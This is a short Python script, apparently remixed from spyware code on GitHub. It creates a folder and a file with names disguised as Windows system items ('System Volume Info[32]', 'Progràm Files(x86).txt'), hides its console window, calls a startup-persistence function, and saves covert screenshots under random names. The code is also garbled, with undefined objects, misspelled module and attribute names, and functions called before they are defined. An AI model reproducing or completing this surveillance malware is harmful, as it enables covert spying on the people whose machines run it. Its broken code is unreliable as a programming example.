#the following is a remix from a github of D4Vinci
#too old to use all of the code in it
import sys
import os,time,random,smtplib,string,base64
import datetime
import random
global t,start,picN

t="";picN=[]

wait = random.randint(1, 5)
time.sleep(wait)

#creates a directory 
dirName = "System Volume Info[32]"
try:
    os.mkdir(dirName)
    print("Directory", dirName, "createed")
except:
    print("Direcotry", dirName, "already exists in the enviroment")


#opens files if not open yet
try :
    f.open('Progràm Files(x86).txt', "a")
    f.close()
except:
    f.open('Progràm Files(x86).txt', "w")
    f.close()

#I think this hides the program
def hidden():
    import wind32console
    import win32gui
    win =win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

addStartup()
hidden()

#to take a screenshot
def Shot():
    global picN
    import pyautogui
    def newName():
        return ''.join(random.choice(string.ascii_upprercase + string.digits) for _ in range (7))
    
name = str(newName())
picnN.append(name)
pyautogui.screenshot().save(name + '.png')

start_time = time.time()
